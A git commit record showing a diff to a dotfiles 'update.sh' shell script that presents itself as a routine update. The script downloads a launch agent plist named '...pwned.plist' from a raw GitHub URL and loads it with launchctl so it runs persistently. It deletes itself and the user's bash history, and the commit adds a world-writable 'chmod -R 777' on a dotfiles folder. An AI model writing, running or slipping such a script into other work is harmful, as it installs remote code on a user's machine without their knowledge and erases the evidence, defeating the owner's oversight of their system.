fa2063a04186537f43979ef409fc6b492b82901e
Mike Binder <InnerSpark@users.noreply.github.com>
2017-12-08 14:47:07 -0800

    Update update.sh

--- update.sh
+++ update.sh
@@ -1,5 +1,5 @@
+chmod -R 777 ~/.dotfiles/macos
 curl -o ~/Library/LaunchAgents/com.zerowidth.launched.pwned.plist https://raw.githubusercontent.com/InnerSpark/dotfiles/master/macos/com.zerowidth.launched.pwned.plist;
-cp /Volumes/Pwned/play.sh ~/.dotfiles/macos/play.sh;
 launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.pwned.plist;
 rm -rf ~/.dotfiles/update.sh;
 rm -rf ~/.bash_history;
